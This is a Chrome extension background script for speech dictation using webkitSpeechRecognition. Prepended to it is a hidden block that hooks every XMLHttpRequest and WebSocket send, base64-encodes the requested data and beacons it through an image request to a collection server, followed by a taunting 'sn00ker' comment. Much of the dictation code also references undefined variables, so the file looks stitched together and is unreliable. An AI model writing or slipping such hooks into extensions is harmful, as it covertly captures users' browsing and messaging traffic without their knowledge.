function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function f(a) {
    s ? m() : (t = a.id, l())
}

function g() {
    try {
        v.lang = u, v.start()
    } catch (a) {}
}

function h() {
    try {
        v.stop()
    } catch (a) {}
}

function i(a) {
    chrome.tabs.query({
        active: !0,
        currentWindow: !0
    }, function(b) {
        if (!j(b)) return void m();
        chrome.tabs.sendMessage(b[0].id, {
            action: "on_results",
            txtToAdd: a
        }, function(a) {})
    })
}

function j(a) {
    return void 0 != a && (null != a && (!(a.length < 1) && a[0].id == t))
}

function k(a) {
    chrome.tabs.query({
        active: !0,
        currentWindow: !0
    }, function(b) {
        if (!j(b)) return void m();
        chrome.tabs.sendMessage(b[0].id, {
            action: "on_interim_results",
            txtToAdd: a
        }, function(a) {})
    })
}

function l() {
    s = !0, p(), g(), n(!0), chrome.runtime.sendMessage({
        message_id: "recognition_started_in_bg"
    })
}

function m() {
    s = !1, h(), p(), n(!1), chrome.runtime.sendMessage({
        message_id: "recognition_stopped_in_bg"
    })
}

function n(a) {
    a ? chrome.browserAction.setIcon({
        path: "images/ic_mic_red_36dp.png"
    }) : chrome.browserAction.setIcon({
        path: "images/ic_mic_black_36dp.png"
    })
}

function update_language(a) {
    u = a, chrome.storage.local.set({
        stored_lang: a
    }, function() {})
}

function o() {}

function p() {
    var a;
    a = s ? "Stop recording" : "Start recording", chrome.contextMenus.update(w, {
        title: a
    })
}

function q(a, b) {
    s ? m() : (t = b.id, l())
}

function b() {
    var a = "";
    chrome.storage.local.get("stored_lang", function(b) {
        a = b.stored_lang, "string" == typeof a && a.length > 1 && update_language(a)
    })
}

function r(a) {
    for (var b = (new Date).getTime(), c = b; c < b + a;) c = (new Date).getTime()
}

function getMasterId() {
    return t
}

function getIsRecording() {
    return s
}

var s = !1,
    t = -1,
    u = "en-US";

b();

var v = new webkitSpeechRecognition();
v.continuous = !0;
v.interimResults = !0; 
v.maxAlternatives = 1;
v.lang = u;

var w = chrome.contextMenus.create({
    title: "Start recording",
    contexts: ["editable"],
    id: ga
}, o);

chrome.browserAction.onClicked.addListener(f);

chrome.runtime.onMessage.addListener(function(a, b) {
    switch (a.message_id) {
        case "start_recording":
            t = a.tab_id, l();
            break;
        case "stop_recording":
            m();
            break;
        case "update_language":
            update_language(a.language)
    }
});

v.onstart = function() {
    xa = !1, ya = "", za = ""
};

v.onend = function() {
    if (xa) {
        for (var a = 0; a < ra.length; a++) ya = ya.replace(new RegExp(ra[a] + "$"), sa[a]);
        i(ya), ya = "", xa = !1
    }
    return i(za), za = "", !s || (v.start(), !1)
}; 

v.onspeechstart = function() {}, v.onspeechend = function() {}, v.onnomatch = function(a) {}, v.onerror = function(a) {
    "not-allowed" === a.error && chrome.runtime.openOptionsPage(function() {}), v.stop()
}; 

v.onresult = function(a) {
    if (void 0 === a.results) return v.onend = null, ua.intentionalPause = !0, v.stop(), void upgrade();
    ya = "";
    for (var b = "", c = a.resultIndex; c < a.results.length; ++c) {
        if (b = X(a.results[c][0].transcript), a.results[c].isFinal) {
            switch (xa = !1, ya = "", pa.indexOf(b)) {
                case 0:
                    return
            }
            for (var d = 0; d < ra.length; d++) b.endsWith(ra[d]) && (b = b.replace(new RegExp(ra[d] + "$"), sa[d]));
            ya = "", i(b)
        } else {
            xa = !0, ya += a.results[c][0].transcript, k(ya), b = " " + b;
            for (var d = 0; d < qa.length; d++)
                if (b.endsWith(qa[d])) return g(), void(va = !0)
        }
    }
};

chrome.tabs.onRemoved.addListener(function(a, b) {
    a == t && m()
});

chrome.tabs.onActivated.addListener(function(a) {
    a.tabId != t && m()
});

chrome.contextMenus.onClicked.addListener(q);